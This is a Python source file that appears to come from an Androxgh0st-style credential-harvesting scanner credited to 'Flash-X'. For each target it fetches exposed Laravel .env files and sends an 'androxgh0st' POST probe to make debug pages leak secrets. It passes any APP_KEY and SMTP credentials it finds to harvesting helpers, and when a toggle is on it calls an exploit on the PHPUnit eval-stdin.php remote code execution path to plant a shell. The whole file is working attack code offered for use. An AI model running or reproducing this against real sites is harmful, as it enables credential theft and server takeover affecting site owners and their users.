import requests
from iprange import get_smtp
from iprange import get_smtp2
from iprange import tools

phpunitshell = tools.phpunitshell()

def di_chckngntd(url):
  try:
    text = '\033[32;1m#\033[0m'+url
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY" in str(get_source):
      get_smtp.get_smtp(url+"/.env",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp.get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source2):
          get_smtp.get_smtp(nurl+"/.env",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp.get_smtp2(nurl,get_source4)
          else:
            print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN WITH HTTPS".format(str(url)))
      else:
          print("\033[1;40m[BY Flash-X] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    
    if phpunitshell() == "on":
      newurl = url+exp
      tools.exploit(newurl)    
  except:
    print("\033[1;40m[BY Flash-X] "+url+" |  \033[1;31;40m ERROR code Unknown")
    pass